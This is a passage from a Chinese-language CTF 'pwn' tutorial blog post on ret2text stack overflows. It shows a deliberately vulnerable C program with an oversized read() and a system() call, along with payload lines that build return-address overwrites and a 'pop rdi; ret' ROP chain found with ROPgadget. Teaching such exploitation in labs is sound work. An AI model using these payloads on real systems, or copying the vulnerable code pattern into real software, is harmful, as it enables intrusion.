+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(func_addr)+p32(bin_sh_addr)</span><br></pre></td></tr></table></figure>
+<p>但我们这样写的payload是对的吗？</p>
+<p>拿到ubuntu上用gdb调试一下：</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203171947.png" alt=""></p>
+<p>到这里你似乎会觉得这个payload没有问题，我们继续往下走，进入到我们布置好的栈中：</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203172108.png" alt=""></p>
+<p>知道开始调用system（）函数后，你才发现，system（）的参数居然是个0xa（‘\n’）！，所以我们的payload其实有问题，但问题在哪呢？</p>
+<p>函数出栈时会经历</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave  ; mov esp,ebp ; pop ebp</span><br><span class="line">ret		;pop eip</span><br></pre></td></tr></table></figure>
+<p>因为ret，会直接进入到我们所布置到的func函数中，然后进入函数就又会进行这几个语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push   ebp</span><br><span class="line">mov    ebp,esp</span><br><span class="line">sub    esp,0x10</span><br></pre></td></tr></table></figure>
+<p>此时画图分析，栈上的结构就成了这样</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203174634.png" alt=""></p>
+<p>此时，我们的“/bin/sh”字符串就被当成了返回地址，而后面输入的‘\n’（0xa）就被当成了参数</p>
+<p>所以，我们应该这样写：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>x0x14 +p32(func_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh_addr)   <span class="comment"># 0xdeadbeef为无用字节或者直接写成出func（）函数后的下一个函数的地址</span></span><br></pre></td></tr></table></figure>
+<p>就应该这样子去布栈</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203175501.png" alt=""></p>
+<h2 id="函数的传参-64位-cdecl-gcc编译程序">函数的传参（64位，__cdecl）（gcc编译程序）</h2>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203181040.png" alt=""></p>
+<p>有了32位程序的基础，如果我们要对64位程序传参，我们可以将参数先布置在栈中，然后让程序执行pop rdi/rsi/rdx的代码，使我们布置在栈中的数据能够存放在这几个寄存器中（参数小于6个）</p>
+<p>但是这样子怎么才能做到呢？<img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203182555.png" alt=""></p>
+<h2 id="rop编程-简单使用">ROP编程（简单使用）</h2>
+<h3 id="指令集的拆分">指令集的拆分</h3>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203183849.png" alt=""></p>
+<p>看这个函数</p>
+<blockquote>
+<p>pop rbp 左边的机械码是5D</p>
+<p>pop r13 左边的机械码是 41 5D</p>
+</blockquote>
+<p>这张图片把他们的地址展示了出来</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203184241.png" alt=""></p>
+<blockquote>
+<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>x</mi><mn>0000000000401206</mn><mo>−</mo><mn>0</mn><mi>x</mi><mn>0000000000401204</mn><mo>=</mo><mn>0</mn><mi>x</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">0x0000000000401206-0x0000000000401204=0x2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">0000000000401206</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">0000000000401204</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">2</span></span></span></span>   pop_r13_addr-pop_r12_addr</p>
+<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>x</mi><mn>0000000000401204</mn><mo>−</mo><mn>0</mn><mi>x</mi><mn>0000000000401203</mn><mo>=</mo><mn>0</mn><mi>x</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">0x0000000000401204-0x0000000000401203=0x1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">0000000000401204</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">0000000000401203</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">1</span></span></span></span>   pop_r12_addr-pop_rbp_addr</p>
+</blockquote>
+<p>明显，这两个的代码长度不同，所以我们可以对长的机械码拆分</p>
+<p>拆分成我们想要的地址</p>
+<p>但是我们不可能自己一直看机械码进行拆分，所以进行这个时候我们就能用一个工具：</p>
+<table><tr><td bgcolor=PowderBlue><label style="color:blue">ROPgadget</label> </td></tr></table>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary &#123;file&#125; &gt; gadget <span class="comment"># 将所有可用的gadget输出到名为gadget的文本中</span></span><br><span class="line">ROPgadget --binary &#123;file&#125; &gt; gadget --only <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></figure>
+<p>使用“ROPgadget --binary {file} &gt; gadget”命令，可以看到有很多很多的gadget</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203190149.png" alt=""></p>
+<p>但是使用“--only “pop |ret””加了限制条件后，就能找到自己想要的</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203190318.png" alt=""></p>
+<p>由此，我们就能倒回去解决刚刚的那个问题，我们可以将返回地址布置成pop_rdi_ret_addr再布置rdi的值入栈：</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203190850.png" alt=""></p>
+<p>所以payload格式应该为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* padding + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(return_addr)</span><br><span class="line"><span class="comment"># padding为溢出的个数（输出多少个无用的a）</span></span><br></pre></td></tr></table></figure>
+<h2 id="例3：">例3：</h2>
+<p>编译成32位程序，关闭地址随机化</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bbbbbbbbbbbbbbbbbbin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">	system(cmd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,b,<span class="number">0x1c</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先最明显的是“/bin/sh”变成了“/bbbbbbbbbbbbbbbbbbin/sh”</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203193051.png" alt=""></p>
+<p>因为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh == /bin/sh</span><br></pre></td></tr></table></figure>
+<p>而且有了指令集拆分的经历，我们可以点进去查看这串字符串的地址</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203193258.png" alt=""></p>
+<p>于是，我们就可以把<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>x</mi><mn>0804</mn><mi>C</mi><mn>03</mn><mi>A</mi></mrow><annotation encoding="application/x-tex">0x0804C03A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">0804</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">03</span><span class="mord mathnormal">A</span></span></span></span>做为sh的地址</p>
+<p>其次，进入do_func（），看到buf离rbp有0x10个字符，我们要造成溢出至少需要0x14个字符，但是read（）函数限制读入0x1c个字符（要经过gdb验证这些数据）</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203193623.png" alt=""></p>
+<p>所以，给我们输入地址的位置只有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>x</mi><mn>1</mn><mi>c</mi><mo>−</mo><mn>0</mn><mi>x</mi><mn>10</mn><mo>=</mo><mn>0</mn><mi>x</mi><mn>8</mn></mrow><annotation encoding="application/x-tex">0x1c-0x10=0x8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">1</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">10</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">8</span></span></span></span></p>
+<p>我们之前的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(func_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh_addr)</span><br></pre></td></tr></table></figure>
+<p>因为这是32位程序，我们后面三个必须要舍弃一个，但直接舍弃就会发生我们之前的错误该怎么办呢？</p>
+<p>回到我们的函数调用：</p>
+<p>最开始会经历这两个步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   ebp</span><br><span class="line">mov    ebp,esp</span><br></pre></td></tr></table></figure>
+<p>就会使我们的bin_sh_addr变成返回地址</p>
+<p>如果，我们向这中间再加一个值，就可以使用bin_sh_addr作为参数了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call func</span><br></pre></td></tr></table></figure>
+<p>也就相当于 push eip</p>
+<p>这样，就自然而然在ebp和bin_sh_addr之间加了一个地址，就可以使bin_sh_addr作为一个参数了</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203194748.png" alt=""></p>
+<p>过程的话长这样</p>
+<p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/20230203200043.png" alt=""></p>
+<blockquote>
+<p>ebp只变了两次，分别在2，3变了</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://github.com/shan-shi/shan-shi.github.io">shans</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://github.com/shan-shi/shan-shi.github.io/2023/02/02/ret2-text/">https://github.com/shan-shi/shan-shi.github.io/2023/02/02/ret2-text/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://github.com/shan-shi/shan-shi.github.io" target="_blank">Shans</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post_share"><div class="social-share" data-image="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/DSC01216.JPG" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/01/22/gcc-pwndbg-tmux%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"><img class="next-cover" src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/DSC00061.JPG" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">gcc,pwndbg,tmux的一些基本命令</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/01/22/gcc-pwndbg-tmux%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/" title="gcc,pwndbg,tmux的一些基本命令"><img class="cover" src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/DSC00061.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-22</div><div class="title">gcc,pwndbg,tmux的一些基本命令</div></div></a></div><div><a href="/2023/01/05/pwn%E7%AC%94%E8%AE%B0-%E4%B8%80/" title="pwn笔记(一)"><img class="cover" src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/DSC01676.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-05</div><div class="title">pwn笔记(一)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2-text%E5%9F%BA%E7%A1%80"><span class="toc-text">ret2_text基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-text">做题基本步骤：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%97%B6%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84%E5%8F%98%E5%8C%96-esp-ebp"><span class="toc-text">函数调用时寄存器的变化（esp，ebp）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%97%B6%E5%9F%BA%E6%9C%AC%E7%A4%BA%E6%84%8F%E5%9B%BE-x86"><span class="toc-text">函数调用时基本示意图(x86)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E6%A0%88"><span class="toc-text">入栈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BA%E6%A0%88"><span class="toc-text">出栈</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B1"><span class="toc-text">例1:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%9A%84%E4%BC%A0%E5%8F%82-32%E4%BD%8D-cdecl"><span class="toc-text">函数的传参（32位，__cdecl）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B2%EF%BC%9A"><span class="toc-text">例2：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%9A%84%E4%BC%A0%E5%8F%82-64%E4%BD%8D-cdecl-gcc%E7%BC%96%E8%AF%91%E7%A8%8B%E5%BA%8F"><span class="toc-text">函数的传参（64位，__cdecl）（gcc编译程序）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rop%E7%BC%96%E7%A8%8B-%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-text">ROP编程（简单使用）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E9%9B%86%E7%9A%84%E6%8B%86%E5%88%86"><span class="toc-text">指令集的拆分</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B3%EF%BC%9A"><span class="toc-text">例3：</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t"> </p><div class="bg-ad"><div> </div></div></div></div></div></div><div class="copyright">&copy;2022   <i id="heartbeat" class="fa fas fa-heartbeat"></i> SHANS </div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://shan-shi.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><div class="aplayer no-destroy" data-id="3166847468" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true" data-lrcType="-1"> </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
